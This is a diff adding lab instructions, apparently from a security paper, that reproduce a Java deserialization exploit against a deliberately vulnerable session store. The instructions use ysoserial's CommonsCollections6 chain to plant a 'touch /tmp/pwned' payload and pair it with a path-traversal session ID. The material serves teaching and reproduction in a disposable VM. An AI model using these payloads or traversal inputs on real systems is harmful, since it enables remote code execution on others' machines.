@@ -17,3 +17,85 @@ The minimal sink is a single unfiltered readObject() on a session file (Listing~
 ---
 
 # Supplementary example information
+
+## Prerequisites
+
+- JDK 8 or 11 strongly recommended. The `CommonsCollections6` chain
+  fires most reliably on these. It can work on newer JDKs but needs extra
+  `--add-opens` flags, and is less predictable.
+- Maven 3.8+
+- Internet access on first build (to fetch `commons-collections:3.1` and ysoserial)
+- A disposable Linux VM/container
+
+---
+
+## Build
+
+```bash
+mvn clean package
+# produces target/deser-lab.jar  (commons-collections bundled inside)
+```
+
+---
+
+## Normal Use (Verifying Funcitonality)
+
+```bash
+java -jar target/deser-lab.jar save            # writes sessions/node01.session
+java -jar target/deser-lab.jar load node01     # loads it back
+# [app] loaded object: Session{id=node01, user=alice, role=USER}
+```
+
+This proves the store works for legitimate objects. The exploit below reuses the
+exact same `load` path.
+
+---
+
+## Exploiting the Application
+
+### Install ysoserial
+
+```bash
+git clone https://github.com/frohoff/ysoserial.git
+cd ysoserial
+mvn clean package -DskipTests        # -> target/ysoserial-<ver>-SNAPSHOT-all.jar
+cd ..
+```
+
+### Generate a malicious session file
+
+On JDK 8:
+
+```bash
+java -jar ysoserial/target/ysoserial-*-all.jar \
+     CommonsCollections6 "touch /tmp/pwned" > sessions/evil.session
+```
+
+On JDK 11+ ysoserial itself needs reflection opened up:
+
+```bash
+java --add-opens java.base/java.util=ALL-UNNAMED \
+     --add-opens java.base/java.lang=ALL-UNNAMED \
+     --add-opens java.base/java.lang.reflect=ALL-UNNAMED \
+     -jar ysoserial/target/ysoserial-*-all.jar \
+     CommonsCollections6 "touch /tmp/pwned" > sessions/evil.session
+```
+
+### Firing the exploit through the vulnerable sink
+
+```bash
+rm -f /tmp/pwned
+java -jar target/deser-lab.jar load evil
+ls -l /tmp/pwned        # the file exists -> arbitrary command executed = RCE
+```
+
+From the application perspective, a session is being loaded. Before any application logic is applied, the command is run during `readObject()` by the gadget chain.
+
+### The Path Traversal Precondition
+
+CVE- didn't use an overt identifier `evil.session`. Instead, the threat actor used the session ID to traverse target systems, such as `../../../../tmp/evil`. This was dependent on the attacker knowing the relative path of the application, can be mimicked by doing the following:
+
+```bash
+cp sessions/evil.session /tmp/evil.session
+java -jar target/deser-lab.jar load "../../../../tmp/evil"
+```
